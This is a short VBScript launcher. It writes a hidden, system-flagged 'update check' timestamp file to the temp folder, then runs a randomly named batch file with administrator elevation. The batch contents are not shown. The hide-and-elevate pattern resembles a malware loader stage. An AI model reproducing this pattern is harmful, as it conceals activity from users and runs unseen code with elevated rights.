Set FSO = CreateObject("Scripting.FileSystemObject")
currentDir = FSO.GetParentFolderName(WScript.ScriptFullName)
Set Shell = CreateObject("Shell.Application")

timerFile = FSO.GetSpecialFolder(2) & "\_last_update_check.uxw"
If Not FSO.FileExists(timerFile) Then
    Set file = FSO.CreateTextFile(timerFile, True)
    file.WriteLine Now
    file.Close
    CreateObject("WScript.Shell").Run "attrib +s +h """ & timerFile & """", 0, True
End If

Shell.ShellExecute "cmd.exe", "/c """ & currentDir & "\data\Q11jkLaQQT19P0QYhjgZ2.bat""", currentDir & "\data", "runas", 1
